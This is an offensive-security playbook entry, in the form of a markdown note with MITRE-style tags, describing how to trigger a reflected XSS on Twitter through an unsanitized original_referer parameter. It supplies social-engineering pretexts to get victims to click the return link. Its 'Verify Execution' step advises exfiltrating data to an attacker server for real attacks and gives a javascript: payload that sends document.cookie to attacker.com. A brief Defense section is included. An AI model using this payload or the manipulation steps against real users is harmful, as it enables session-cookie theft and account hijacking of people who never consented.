---
tags:
  - xss-trigger
  - javascript-execution
  - twitter
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 021a273b-f20f-46c6-b220-24cf08d8a03b
created_at: '2025-12-14T03:15:53.066Z'
updated_at: '2025-12-14T03:15:53.066Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-XSS-via-Return-to-Previous-Site

## Summary

This procedure triggers the reflected XSS by inducing the victim to click the 'return to previous site' link after following, executing the embedded JavaScript payload in the Twitter domain context.

## Description

Post-follow, Twitter generates a return link using the unsanitized original_referer parameter. Clicking it interprets the javascript: URI, running arbitrary code. This can steal session cookies, tokens, or perform actions like posting on behalf of the victim. The attack requires victim click but yields high impact in authenticated contexts.

## Requirements

1. Victim has completed the follow step
2. Payload is a valid javascript: URI
3. Social engineering to prompt the return click

## Defense

Defensive measures and detection strategies:

- Validate and escape referer parameters (e.g., strip javascript: schemes)
- Use strict referrer policies and CSP to prevent execution
- Log and alert on reflected parameters in redirects

## Objectives

1. Execute JS payload for code injection
2. Collect sensitive data like cookies or localStorage
3. Enable follow-on attacks like session hijacking

## Instructions

### Step 1: Confirm Post-Follow State

**Context**: Ensure the victim is on the complete page with the return link visible.

If needed, send a follow-up message: "Now return to the site to continue."

### Step 2: Induce Return Click

**Context**: The return link is: <a href="[original_referer]">Return to previous site</a>, reflecting the payload.

Encourage click via pretext: "Click return to go back."

### Step 3: Verify Execution

**Context**: Payload runs; for testing, use alert(1). For real attacks, exfiltrate via img src to attacker server.

Example advanced payload: javascript:fetch('https://attacker.com/steal?cookie='+document.cookie)

> Execution: JS runs in Twitter's origin, accessing victim data.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[xss-trigger]]
- [[javascript-execution]]
- [[twitter]]
